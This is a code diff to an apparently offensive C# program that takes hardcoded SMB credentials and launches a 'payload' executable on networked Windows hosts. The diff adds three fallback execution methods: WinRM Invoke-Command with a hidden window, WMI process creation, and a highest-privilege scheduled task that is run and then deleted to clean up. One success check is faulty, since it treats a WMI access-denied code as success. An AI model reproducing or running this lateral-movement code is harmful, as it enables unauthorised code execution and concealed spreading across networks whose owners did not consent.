@@ -3,11 +3,13 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Management;
 using System.Net.NetworkInformation;
+using System.Net.Security;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
-
+using AuthenticationLevel = System.Management.AuthenticationLevel;
 class Program
 {
     private const string SMB_USERNAME = "user";
@@ -62,7 +64,7 @@ class Program
 
                 string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";
 
-                bool executionSuccess = await ExecuteRemoteCommand(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);
+                bool executionSuccess = ExecuteRemoteCommand(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);
 
                 if (executionSuccess)
                 {
@@ -182,49 +184,140 @@ class Program
         return host.AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
     }
 
-    private static async Task<bool> ExecuteRemoteCommand(string remoteIp, string username, string password, string commandToExecute)
+    private static bool ExecuteRemoteCommand(string remoteIp, string username, string password, string commandToExecute)
     {
-        string psScript = $"Start-Process -FilePath \"{commandToExecute}\"";
-        string fullPsCommand = $"powershell.exe -Command \"& {{ Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ {psScript} }} }}\"";
+        // Helper to run a local process and capture output
+        (int ExitCode, string StdOut, string StdErr) RunProcess(string fileName, string args, int timeoutMs = 20000)
+        {
+            using (var p = new Process())
+            {
+                p.StartInfo.FileName = fileName;
+                p.StartInfo.Arguments = args;
+                p.StartInfo.RedirectStandardOutput = true;
+                p.StartInfo.RedirectStandardError = true;
+                p.StartInfo.UseShellExecute = false;
+                p.StartInfo.CreateNoWindow = true;
 
+                try
+                {
+                    p.Start();
+                }
+                catch (Exception exStart)
+                {
+                    return (-1, "", $"Failed to start {fileName}: {exStart.Message}");
+                }
+
+                string outStr = p.StandardOutput.ReadToEnd();
+                string errStr = p.StandardError.ReadToEnd();
+                if (!p.WaitForExit(timeoutMs))
+                {
+                    try { p.Kill(); } catch { }
+                    return (-2, outStr, errStr + " (timeout)");
+                }
+                return (p.ExitCode, outStr, errStr);
+            }
+        }
+
+        Console.WriteLine($"[EXEC] Attempting remote execution on {remoteIp} using provided credentials...");
+
+        // --- Method A: PowerShell Invoke-Command (WinRM) ---
         try
         {
-            using (Process process = new Process())
+            string psCommand = $"Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ Start-Process -FilePath '{commandToExecute}' -WindowStyle Hidden }} -ErrorAction Stop";
+            string args = $"-NoProfile -NonInteractive -Command \"{psCommand}\"";
+            Console.WriteLine("[EXEC-A] Trying PowerShell Invoke-Command (WinRM)...");
+            var res = RunProcess("powershell.exe", args, 15000);
+            Console.WriteLine($"[EXEC-A] Exit {res.ExitCode}. Out: {res.StdOut}. Err: {res.StdErr}");
+            if (res.ExitCode == 0)
             {
-                process.StartInfo.FileName = "powershell.exe";
-                process.StartInfo.Arguments = $"-Command \"& {{ Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ Start-Process -FilePath '{commandToExecute}' }} }}\"";
-
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.RedirectStandardError = true;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.CreateNoWindow = true;
-
-                Console.WriteLine($"[DEBUG] Executing PowerShell command: {process.StartInfo.Arguments}");
-
-                process.Start();
-                string output = await process.StandardOutput.ReadToEndAsync();
-                string error = await process.StandardError.ReadToEndAsync();
-                await Task.Run(() => process.WaitForExit(15000));
-
-                if (process.ExitCode == 0)
-                {
-                    Console.WriteLine($"[DEBUG] Remote execution output: {output}");
-                    return true;
-                }
-                else
-                {
-                    Console.WriteLine($"[ERROR] PowerShell process exited with code {process.ExitCode} for {remoteIp}.");
-                    Console.WriteLine($"[ERROR] Standard Output: {output}");
-                    Console.WriteLine($"[ERROR] Standard Error: {error}");
-                    return false;
-                }
+                Console.WriteLine("[EXEC-A] Remote execution via WinRM reported success.");
+                return true;
             }
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"[ERROR] Exception during remote execution on {remoteIp}: {ex.Message}");
-            return false;
+            Console.WriteLine("[EXEC-A] Exception: " + ex.Message);
         }
+
+        // --- Method B: WMI (Win32_Process.Create) ---
+        try
+        {
+            Console.WriteLine("[EXEC-B] Trying WMI (Win32_Process.Create) via System.Management...");
+            ConnectionOptions connOpts = new ConnectionOptions
+            {
+                Username = username,
+                Password = password,
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.Default,
+                EnablePrivileges = true,
+                Authority = null
+            };
+
+            string path = $"\\\\{remoteIp}\\root\\cimv2";
+            var scope = new ManagementScope(path, connOpts);
+            scope.Connect(); // may throw
+
+            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
+            {
+                var inParams = processClass.GetMethodParameters("Create");
+                // If commandToExecute has spaces, wrap it as needed
+                inParams["CommandLine"] = commandToExecute;
+                var outParams = processClass.InvokeMethod("Create", inParams, null);
+                if (outParams != null)
+                {
+                    var returnCode = Convert.ToInt32(outParams["returnValue"]);
+                    var newPid = outParams["processId"] != null ? outParams["processId"].ToString() : "(none)";
+                    Console.WriteLine($"[EXEC-B] WMI Create returned {returnCode}, pid={newPid}");
+                    if (returnCode == 0 || returnCode == 2) // 0 success; 2 sometimes "access denied" variants vary by environment
+                        return true;
+                }
+            }
+        }
+        catch (Exception exWmi)
+        {
+            Console.WriteLine("[EXEC-B] WMI failed: " + exWmi.Message);
+        }
+
+        // --- Method C: remote Scheduled Task (schtasks) fallback ---
+        try
+        {
+            Console.WriteLine("[EXEC-C] Trying remote scheduled task via schtasks...");
+            string taskName = "RemoteRun_" + Guid.NewGuid().ToString("N");
+            // Ensure command path is quoted
+            string quotedCmd = $"\"{commandToExecute}\"";
+            // Create the task (runs once at a dummy time but we'll force run immediately)
+            string createArgs = $"/C schtasks /Create /S {remoteIp} /U {username} /P {password} /SC ONCE /ST 00:00 /TN \"{taskName}\" /TR {quotedCmd} /RL HIGHEST /F";
+            var createRes = RunProcess("cmd.exe", createArgs, 20000);
+            Console.WriteLine($"[EXEC-C] create exit {createRes.ExitCode}. Out: {createRes.StdOut}. Err: {createRes.StdErr}");
+
+            if (createRes.ExitCode == 0 || createRes.StdOut?.ToLower().Contains("success") == true)
+            {
+                // Run the task
+                string runArgs = $"/C schtasks /Run /S {remoteIp} /U {username} /P {password} /TN \"{taskName}\"";
+                var runRes = RunProcess("cmd.exe", runArgs, 15000);
+                Console.WriteLine($"[EXEC-C] run exit {runRes.ExitCode}. Out: {runRes.StdOut}. Err: {runRes.StdErr}");
+                if (runRes.ExitCode == 0 || runRes.StdOut?.ToLower().Contains("successfully") == true)
+                {
+                    Console.WriteLine("[EXEC-C] Scheduled task launched successfully.");
+                    // Optionally delete the task
+                    string delArgs = $"/C schtasks /Delete /S {remoteIp} /U {username} /P {password} /TN \"{taskName}\" /F";
+                    var delRes = RunProcess("cmd.exe", delArgs, 10000);
+                    Console.WriteLine($"[EXEC-C] cleanup exit {delRes.ExitCode}.");
+                    return true;
+                }
+            }
+            else
+            {
+                Console.WriteLine("[EXEC-C] Could not create scheduled task on remote host.");
+            }
+        }
+        catch (Exception exSch)
+        {
+            Console.WriteLine("[EXEC-C] Exception: " + exSch.Message);
+        }
+
+        Console.WriteLine("[EXEC] All remote execution attempts failed. See logs above for details.");
+        return false;
     }
 
     [DllImport("mpr.dll")]
